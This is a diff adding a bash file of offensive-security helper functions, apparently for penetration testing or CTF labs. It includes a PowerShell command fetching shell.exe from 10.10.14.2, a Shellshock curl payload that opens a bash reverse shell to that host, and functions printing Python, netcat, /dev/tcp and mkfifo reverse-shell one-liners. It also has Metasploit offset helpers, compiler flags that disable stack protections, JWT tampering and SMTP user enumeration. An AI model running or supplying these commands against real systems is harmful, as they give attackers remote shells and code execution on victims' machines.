@@ -1,0 +1,72 @@
+powershell-download(){
+tar1=powershell
+tar2=" (New-Object System.Net.WebClient).Downloadfile('http://10.10.14.2:8000/shell.exe','shell.exe')"
+echo -e $tar1$tar2
+}
+shellshock(){
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/5555 0>&1'" \"
+}
+pattern(){
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $1
+}
+poffset(){
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l $1 -q $2
+}
+compile-gcc(){
+gcc $1 -o $2 -no-pie -z execstack -m32
+}
+decode_jwt(){
+python ~/tools/jwt_tool/jwt_tool.py $1
+}
+tamper_jwt(){
+python ~/tools/jwt_tool/jwt_tool.py -T $1
+}
+update_tools(){
+sudo pip3 install --upgrade wfuzz
+}
+info-in-image(){
+steghide extract -sf $1
+}
+incomming_ping(){
+sudo tcpdump -ni tun0 icmp
+}
+#SMTP user enumeration
+smtp4user(){
+smtp-user-enum -M VRFY -U ~/tools/SecLists/Usernames/Names/names.txt -t $1
+}
+# Listener
+lis(){
+echo "nc -nlvp $1"
+nc -nlvp $1
+}
+# Python reverse shell
+py-rev-shell(){
+IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
+# random port generate.
+PORT=$(shuf -i 2000-65000 -n 1)
+echo "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"
+echo "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+}
+# Reverse Shell
+rev-shell(){
+IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
+# random port generate.
+PORT=$(shuf -i 2000-65000 -n 1)
+echo "nc -e /bin/bash $IP $PORT"
+echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
+}
+#IP-PORT
+iport(){
+IP=$(ifconfig | grep 192.168.0.* | awk '{print $2}')
+# random port generate.
+PORT=$(shuf -i 2000-65000 -n 1)
+echo $IP":"$PORT
+}
+len(){
+echo "$1" | wc -c
+}
+rar_extract(){
+sudo unrar e $1
+}
